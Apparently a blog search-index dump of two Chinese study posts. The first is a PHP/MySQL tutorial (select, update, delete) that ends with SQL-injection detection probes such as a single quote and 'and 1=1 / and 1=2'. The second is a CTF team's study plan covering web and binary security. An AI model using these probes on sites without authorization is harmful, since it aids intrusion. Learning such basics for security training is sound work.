class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$password &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;mydatabase&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建链接</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">&#x2F;&#x2F; 检查链接</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result &#x3D; mysqli_query($conn,&quot;SELECT * FROM myguests ORDER BY fname&quot;);</span><br><span class="line"></span><br><span class="line">while($row &#x3D; mysqli_fetch_array($result))&#123;</span><br><span class="line">    echo $row[&quot;fname&quot;] . &quot; &quot; . $row[&quot;lname&quot;] . &quot; &quot; . $row[&quot;email&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn-&gt;close();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;网页显示</span><br><span class="line">Hirasawa Yui yuiiii123@gmail.com</span><br><span class="line">John Doe john@example.com</span><br><span class="line">Julie Dooley julie@example.com</span><br><span class="line">Mary Moe mary@example.com</span><br></pre></td></tr></table></figure><h2 id="根据两列进行排序"><a href="#根据两列进行排序" class="headerlink" title="根据两列进行排序"></a>根据两列进行排序</h2><p>可以根据多个列进行排序。当按照多个列进行排序时，只有第一列的值相同时才使用第二列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1, column2</span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-update"><a href="#PHP-MySQL-update" class="headerlink" title="PHP MySQL update"></a>PHP MySQL update</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con&#x3D;mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;mydatabase&quot;);</span><br><span class="line">&#x2F;&#x2F; 检测连接</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;连接失败: &quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&quot;UPDATE person SET age&#x3D;16</span><br><span class="line">WHERE lname&#x3D;&#39;yuki&#39;&quot;);</span><br><span class="line"></span><br><span class="line">mysqli_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-delete"><a href="#PHP-MySQL-delete" class="headerlink" title="PHP MySQL delete"></a>PHP MySQL delete</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name</span><br><span class="line">WHERE some_column &#x3D; some_value</span><br></pre></td></tr></table></figure><p>实例见 <strong><a href="https://www.runoob.com/php/php-mysql-delete.html">菜鸟教程</a></strong></p><h1 id="判断是否存在注入点——SQL注入"><a href="#判断是否存在注入点——SQL注入" class="headerlink" title="判断是否存在注入点——SQL注入"></a>判断是否存在注入点——SQL注入</h1><ol><li><p>加入单引号 ‘ 提交</p><p>如果出现错误提示，则该网站可能存在注入漏洞</p></li><li><p>数字型判断是否有注入</p><p>语句：and 1=1 ; and 1=2 （经典）、’ and ‘1’ = 1 (字符型)</p><p>分别返回不同页面，说明存在注入漏洞</p></li><li><p>字符型判断是否有注入</p><p>语句：’ and ‘1’ = 1; ‘ and ‘1 = 2; （经典）</p><p>分别返回不同页面，说明存在注入漏洞</p><p>分析：加入 ‘ and ‘1’=1 返回正确页面，加入 ‘ and ‘1=2 返回错误页面说明也有注入漏洞</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hut-sec 上学期+寒假任务</title>
      <link href="2021/01/23/hut-sec%20%E4%B8%8A%E5%AD%A6%E6%9C%9F+%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1/"/>
      <url>2021/01/23/hut-sec%20%E4%B8%8A%E5%AD%A6%E6%9C%9F+%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="hut-sec-上学期-寒假任务"><a href="#hut-sec-上学期-寒假任务" class="headerlink" title="hut-sec 上学期+寒假任务"></a>hut-sec 上学期+寒假任务</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>会用到的工具：</p><p>链接：<a href="https://pan.baidu.com/s/1X_g0K8yCAANSLJ3GTrqCwQ">https://pan.baidu.com/s/1X_g0K8yCAANSLJ3GTrqCwQ</a><br>提取码：jeba</p><h3 id="ALL"><a href="#ALL" class="headerlink" title="ALL"></a>ALL</h3><ul><li><a href="https://segmentfault.com/a/1190000017986794">博客搭建</a>：github+hexo</li><li>linux系统常用命令的了解,这里推荐使用VMware虚拟机(放在云盘中),Linux系统的镜像文件自己去网上下载(Linux常用命令可以在菜鸟教程学习)</li><li>学会如何配置环境变量（win+linux）</li></ul><h3 id="刷题须知："><a href="#刷题须知：" class="headerlink" title="刷题须知："></a>刷题须知：</h3><ol><li><strong>一开始刷题的时候，以熟悉漏洞点为主，遇到不会的题目，要多用搜索引擎，查找相关知识点。</strong></li><li><strong>做完题之后，最好能对漏洞点进行总结。并且输出成文章。</strong></li><li>学会避重就轻，从简单题开始刷。</li><li>遇到相同知识点的，可以快速过一遍就行。</li></ol><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><ul><li>搭建好PHP环境.（<a href="https://blog.csdn.net/u012861467/article/details/54692236">phpStudy,Phpstorm</a>）<a href="https://zhuanlan.zhihu.com/p/104574959?utm_source=qq">Phpstorm白嫖姿势</a></li><li><strong>了解</strong>前端三件套（HTML,CSS,JAVASCRIPT）这里不用学的太深，看到认识就行</li><li><strong>掌握</strong>PHP</li><li>Python 掌握基本语法，然后学习 <a href="https://2.python-requests.org//zh_CN/latest/user/quickstart.html">requests 库</a> 的使用, flask 的基础用法也需要了解。</li><li><strong>了解</strong>数据库(mysql)的基础语法</li><li><strong>掌握</strong>Phpstorm+xdebug动态调试技巧（需要 phpstudy 配合）</li><li>最后利用学习的PHP和mysql写一个留言板或者说写一个<strong>自己想写的东西（有前后端交互的网页）</strong></li><li>HTTP协议在学有余地的基础上可以去学一下，推荐《图解HTTP》</li><li>买一台自己的服务器，在上面也搭建一下php和mysql环境，把自己的项目部署上去。(<a href="https://developer.aliyun.com/adc/student/">https://developer.aliyun.com/adc/student/</a> 可以在这里白嫖学生机)</li><li>搭好博客，并且记录下搭建博客的过程。</li><li>从网上下载sqllabs、uploadlabs、dvwa源码，并且尝试本地搭建，然后尝试去做(配合源码分析漏洞的原理)<strong>大致做完这就可以开始刷题了</strong></li><li>最开始的刷题推荐：BUUCTF web 极客大挑战系列 | CTFSHOW web入门 | XCTF 新手区及进阶区的第一页 （CTFSHOW的VIP账号在群里有）</li></ul><h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p>二进制方向研究偏底层，对底层知识要求较高，前期学习枯燥，后期学习自闭，但是学好就是爷爷。二进制分为两个方向一个是pwn，另一个是逆向工程。具体两个是干什么，请自行查看<a href="https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/">CTFWIKI</a></p><ul><li>掌握汇编语言基本语法(随便给段代码能看懂就行，不要求深入，推荐书籍：《汇编语言》——王爽)</li><li>理解堆栈运作方式，明确栈帧等基本概念，了解编译链接过程(推荐书籍：程序员的自我修养)</li><li>熟悉linux下c的一些函数调用约定和一些基础函数的用法(如函数传参到底是怎么传的，数据在内存中是什么样的，内存的布局是怎样的等等。自己写一些c的代码放进gdb调，理解整个过程)<a href="http://cache.amobbs.com/bbs_upload782111/files_29/ourdev_559163.pdf">http://cache.amobbs.com/bbs_upload782111/files_29/ourdev_559163.pdf</a><br>常用工具：(寒假先把gdb用熟练了就行，其他工具等打比赛自然会接触到)</li><li>vmware虚拟机，推荐ubuntu16.04，还可以再装个win7</li><li>gdb</li><li>ida(放在云盘中)</li><li>pwntools</li><li>z3(逆向常用)</li><li>ollydbg(逆向常用)</li></ul><p>感觉学的差不多了可以去跟着视频做做题(推荐Liveoverflow，b站油管都有)</p><p>更新：liveoverflow练习虚拟机protostar：<a href="https://drive.google.com/open?id=1AjvW7mEWrT3hGH23KBNv24KFqvCrWwJf">https://drive.google.com/open?id=1AjvW7mEWrT3hGH23KBNv24KFqvCrWwJf</a></p><h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><p>《汇编语言》<br>《深入理解计算机系统》书本习题以及课后lab(重点)<br>lab：<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a><br>《程序员的自我修养》<br>这些都是基本功，需要扎实，不用急着去刷题，先把这些都啃一遍</p><h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><ul><li>王爽汇编语言</li><li>windows核心编程</li><li>逆向寒假要求就是打好基础，明年开始接触题目和工具</li><li>多逛论坛：看雪论坛，吾爱破解，腾讯玄武实验室公众号，多接触大佬，学习最新的知识，甚至任何问题都可以在论坛中解决</li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
